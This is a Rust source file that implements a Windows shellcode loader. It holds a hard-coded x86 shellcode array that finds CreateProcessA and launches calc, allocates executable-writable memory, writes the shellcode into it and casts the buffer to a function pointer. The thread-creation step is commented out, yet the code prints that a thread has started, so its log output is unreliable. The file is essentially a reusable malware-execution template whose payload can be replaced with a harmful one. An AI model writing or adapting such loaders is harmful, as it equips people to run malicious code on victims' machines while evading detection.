use std::{ffi::c_void, mem::transmute};

use windows::Win32::System::{
    Diagnostics::Debug::WriteProcessMemory,
    Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAlloc},
    Threading::{GetCurrentProcess, Sleep},
};

const SHELLCODE: &[u8] = &[
    0x31, 0xdb, 0x64, 0x8b, 0x7b, 0x30, 0x8b, 0x7f, 0x0c, 0x8b, 0x7f, 0x1c, 0x8b, 0x47, 0x08, 0x8b,
    0x77, 0x20, 0x8b, 0x3f, 0x80, 0x7e, 0x0c, 0x33, 0x75, 0xf2, 0x89, 0xc7, 0x03, 0x78, 0x3c, 0x8b,
    0x57, 0x78, 0x01, 0xc2, 0x8b, 0x7a, 0x20, 0x01, 0xc7, 0x89, 0xdd, 0x8b, 0x34, 0xaf, 0x01, 0xc6,
    0x45, 0x81, 0x3e, 0x43, 0x72, 0x65, 0x61, 0x75, 0xf2, 0x81, 0x7e, 0x08, 0x6f, 0x63, 0x65, 0x73,
    0x75, 0xe9, 0x8b, 0x7a, 0x24, 0x01, 0xc7, 0x66, 0x8b, 0x2c, 0x6f, 0x8b, 0x7a, 0x1c, 0x01, 0xc7,
    0x8b, 0x7c, 0xaf, 0xfc, 0x01, 0xc7, 0x89, 0xd9, 0xb1, 0xff, 0x53, 0xe2, 0xfd, 0x68, 0x63, 0x61,
    0x6c, 0x63, 0x89, 0xe2, 0x52, 0x52, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x52, 0x53, 0xff, 0xd7,
];

pub fn inject_shellcode() {
    unsafe {
        // Open process
        let h_process = GetCurrentProcess();
        println!("[i] Current process handle: {h_process:?}");

        // Allocate memory
        let p_alloc = VirtualAlloc(
            None,
            SHELLCODE.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if p_alloc.is_null() {
            panic!("Allocation failed");
        }

        println!("[i] Allocation of shellcode memory: {p_alloc:p}");

        // write vm
        let mut out_buffer = 0;
        WriteProcessMemory(
            h_process,
            p_alloc,
            SHELLCODE.as_ptr() as *const u8 as *const c_void,
            SHELLCODE.len(),
            Some(&mut out_buffer),
        )
        .unwrap();

        println!("[i] Process memory written to buffer: {p_alloc:p}");

        let f_ptr = transmute::<
            _,
            unsafe extern "system" fn(lpthreadparameter: *mut core::ffi::c_void) -> u32,
        >(p_alloc);

        println!("[+] Thread started..");

        loop {
            Sleep(200);
        }

        // Create thread
        // CreateThread(
        //     None,
        //     0,
        //     Some(f_ptr),
        //     None,
        //     THREAD_CREATION_FLAGS(0),
        //     None,
        // ).unwrap();
    }
}
